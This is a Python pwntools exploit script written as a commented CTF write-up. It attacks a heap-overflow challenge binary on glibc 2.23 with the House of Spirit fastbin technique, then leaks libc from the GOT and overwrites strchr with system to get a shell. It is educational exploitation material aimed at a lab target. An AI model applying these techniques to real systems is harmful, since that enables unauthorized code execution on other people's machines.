#!/usr/bin/env python3
'''
House of Spirit Challenge writeup -- Fastbin 

The fastbin challenge adds some more complications with there being an 
additional security check with the House of Spirit on a fake fastbin 
chunk. 

This, coupled with us not being able to write NULL bytes, 
makes the challenge significantly harder than the tcache version. 
''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.challenge-2.23'
libc_name = "../../libc_versions/2.23/libc-2.23.so"
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the resturant
def set_resturant(name, intro=False):
	if(intro == False): 
		p.sendlineafter(">", "5")

	p.sendlineafter("name", name)

# Add a sandwich (order)
def add(jelly, butter): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", jelly) # Input for butter
	p.sendlineafter("Type: ", butter)  # Input for jelly
	return 

# Remove the sandwich (eat)
def remove(index):
	p.sendlineafter(">", "2") 
	p.sendlineafter("remove:", str(index))
	return 

# Edit the most recent order
def edit(jelly, butter):
	p.sendlineafter(">", "4") 
	p.sendlineafter("Type: ", jelly) # Input for butter 
	p.sendlineafter("Type: ", butter) # Input for jelly 
	return 

# Print a sandwich
def print_wich(index): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("view:", str(index))
	p.recvuntil("made a ") 
	butter = p.recvuntil(" butter").replace(" butter", "")
	p.recvuntil("and ")  
	jelly = p.recvuntil(" jelly").replace(" jelly", "") 
	return butter, jelly 

# Creates a fake chunk for the house of spirit
def fake_chunk():

	'''
	The freeing of chunks must meet the following requirements: 
	- Memory aligned (on 64-bit, this must end with a 0x0) 
	- A proper size must be used. 

	The 'resturant_name' is a fantastic candiate to put a 'fake chunk'
	because we control the contents of it well. This is important for two reasons: 
	- Easy to create a proper fake chunk
	- Once the chunk has been allocated (with a 'sandwich') we can alter the 
	  sandwich data values (including the pointers) with whatever we want!

	The fake chunk would look like this: 
	
	--------------
	prev_size 0x0 
	size 0x41 <-- Want to go into the 0x40 fastbin bin
	--------------

	Haha, there is something wrong here! 'strcpy' does not copy 
	null bytes! So, we have to be clever here...
	The 'prev_size' is ONLY used if consolidation happens. So, 
	as long as consolidiation does NOT happen, this can be whatever
	value we want. 

	Although the 'prev_inuse' bit does not need to be set, it is easy 
	to set and can prevent issues down the road. 

	Additionally, the fastbin has a check to 'nextchunk'
	that ensures it has a proper size. So, we have to add
	the code for this check in too. This check can be found at: 
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3897. 


	Real fake chunk: 

        --------------
        prev_size: AAAAAAAA
        size: 0x41 <-- Want to go into the 0x40 fastbin bin
        --------------
	prev_size: don't care
	size: 0x20 (just needs to be a valid size) 
	'''
	#######################
	# Create a fake chunk #
	#######################

	fake_next_size = "A" * 0x40 # Accounts for the fake_chunk size 
	fake_next_size += "B" * 8 # prev_size of nextchunk
	fake_next_size += p64(0x20) # Fake size 
	
	set_resturant(fake_next_size, intro=True)

	# The sizes of all the orders are of 0x40
	chunk_size = 0x41 

	'''
	Because we cannot write NULL bytes, the payload becomes a little more complicated
	Even though we can't DIRECTLY write NULL bytes, the ending of all strings has a
	NULL byte! So, if we add data while decrementing the length one byte
	at a time, then we can write a arbitrary NULL bytes clean up the data. 

	For example, look at the following data: 
	---------
	AAAAAAAAA\x00 <--- null byte at end to terminate string
	---------
	
	Now, if we write the LENGTH - 1 bytes then it will look like the 
	following: 
	---------
	AAAAAAAA\x00\x00 <--- Two null bytes!
	---------

	There are TWO places where this must be NULLED out: 
	- Bytes around size
	- 'next' ptr of fake sandwich

	By using the trick above, we can clear all but 0x41 for the size
	and can NULL out all 8 bytes of the memory address. 

	Now, when we try to run the house of spirit and iterate over the 
	chunk later, it will be possible :) 	
	'''

	# NULLing out location of fake 'next' pointer
	for i in range(8): 
		fake_chunk = "A" * (0x48 -2-i)	
		set_resturant(fake_chunk, intro=False)

	# NULLing out bytes around the 'size' 
	for i in range(8): 
		fake_chunk = "A" * (8 + 7-i)	
		set_resturant(fake_chunk, intro=False) 

	# Filler for the prev_size 
	fake_chunk = "A" * 8 	# Offset 0x0
	
	# The fake chunk size
	fake_chunk += p64(chunk_size) # Offset 0x8

	# Use the resturant name as a fake chunk for later
	set_resturant(fake_chunk, intro = False)


def house_of_spirit():
	###########################
	# Exploit Buffer Overflow #
	###########################

	'''
	Sandwich struct:
	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: next ptr
	------------

	The structure (after the butter variable) has a pointer to 
	the 'next' ptr. Because the butter variable has a buffer 
	overflow, we can OVERWRITE this with an arbitrary value. 
	Below is an example of this vulnerability: 

	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: AAAAAAAAA (corrupted) 
	------------

	We will set the 'next' pointer to the fake_chunk 
	(from the previous step) that we made. An example of this is shown below:

	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: fake_chunk (NICE)
	------------

	NOTE: If the location of 'next' does not point to 0x0 (on the fake chunk), 
	then it will continue trying to find MORE sandwiches. So, make sure that 
	the fake_chunk has 0x0 at that offset.

	'''

	print("Overwriting pointer with 0x40 chunk via buffer overflow")

	# Filler prior to overflow
	butter = "C" * 40 
	
	# Location of the 'resturant_name' variable, which holds our fake chunk.
	# We add 0x10 because the pointer (that the user is given) is mem + 0x10.
	butter += p64(elf.symbols['resturant_name'] + 0x10) 

	# Exploit the buffer overflow to overflow 'next' ptr.
	add("D" * 8, butter)
	
	###################
	# House of Spirit #
	################### 
	print("Freeing arbitrary pointer (House of Spirit)")
	print("The resturant_name variable is now in the 0x40 fastbin")
	# Puts the 'fake chunk' (resturant_name variable) into the 0x40 fastbin bin
	remove(1)

	

def overlap_chunks():
	
	''' 
	The 0x40 fastbin has a single chunk inside of it, 
	which is the resturant_name variable fake_chunk. 
	This is what the fastbin looks like: 

	0x20: 
	...
	0x40 bin: resturant_name + 0x10
	0x50:
	...


	If we create a NEW order, the chunk will be allocated to us, 
	which would be our fake chunk! This will NOW be within the resturant_name!
	'''

	#####################
	# Overlapping Chunk #
	#####################

	# Get the overlapping chunk that was added by the House of Spirit in the previous step
	add("E" * 8, "F" * 8) 

def read_write_prim():
	'''	
	After overlapping the chunks, resturant_name/sandwich will look like:

	----------------
	prev_size: AAAAAAAA                    <--------|
	size: 0x41                                      |
	jelly_ptr (start data section of chunk)         | This is all within resturant_name
	butter buffer                                   |
	next                                            |
	----------------                       <--------|

	Because we control the 'resturant_name' variable, we 
	will be able to write all over the data in the sandwich! 
	
	Anything look juicy here? There is a pointer (jelly_ptr) that we can 
	overwrite for both 'reading' and 'writing'! From this, we can
	create an arbitrary write or read primative 
	by overriding the sandwich->jelly_ptr variable by editing
	resturant_name.
	
	If we overwrite the sandwich->jelly_ptr, we can READ from anywhere
	via the 'print_wich' command. Additionally, to write anywhere, we just
	edit a sandwich. Of course, in order to set the location of where to read
	or write to, we need to alter this pointer via a call to 'set_resturant'. 

		
	We HAVE the primitive, but what to overwrite? The easiest way to get code
	execution is to overwrite a function pointer of somekind with either a 
	system or a one_gadget. In order to do this, we need to know WHERE LibC 
	is at. The best way to do this is use the GOT to leak an address to LibC. 

	The choice of GOT? 'strchr' works for both a READ (anything works for a read) 
	and a WRITE (shown in the next step). So, we can choose to use 'strchr' here. 
	'''


	##########################
	# Leak via Ptr Overwrite #		
	##########################
	print("Writing GOT table address over jelly_ptr to leak LibC")

	# Overwrite the 'jelly_ptr' in order to create an arbitrary read/write.
	# The jelly_ptr is overwritten with the location of the strchr GOT entry	# This will have an address to GLibC at this location.
	set_resturant("A" * 0x10 + p64(elf.got['strchr']))
	_, jelly = print_wich(1)

	print("Address of strchr", hex(elf.got['strchr']))
	# By using the 'jelly_ptr' at strchar GOT entry, we leak GLibC.
	libc_leak = u64(jelly + "\x00\x00") 
	print("LibC Leak: ", hex(libc_leak)) 

	libc_base = libc_leak - libc_offset
	print("LibC Base: ", hex(libc_base))
	return libc_base


def win(libc_base):
	'''
	The 'jelly_ptr' is pointing to 'strchr' GOT entry (from the previous step).
	We overwrite this with 'system' because this gives us an easy shell. 
	'strchr' is a great GOT entry to overwrite because it accepts a 
	string that we control as the input. This emulates us calling system
	in the best way possible.

	Butter is used as the parameter for 'system'. This is because 
	'strchr' takes in a parameter that is a pointer to a string. 
	By passing in the buffer variable (which we control), we can 
	control the parameter for system. 
	'''
	##################
	# Code Execution # 
	##################
	print("Overwrite strchr with system")
	print("Sytem: ", hex(libc_base + system_offset))

	edit(p64(libc_base + system_offset), "/bin/sh")
	p.sendline("/bin/sh")	


''' 
Plan: 

- Overwrite next pointer to point to the resturant (with a fake chunk) 
- House of spirit (free the chunk that we just corrupted) 
- Edit resturant to change jelly_ptr to PLT/GOT entry 
	- Use this to read (leak LibC) 
	- Use this to write (system) 
- Win :)

'''

system_offset = 0x3f520
libc_offset = 0x80af0

fake_chunk()
house_of_spirit()
overlap_chunks()
libc_base = read_write_prim()
win(libc_base)
p.interactive()


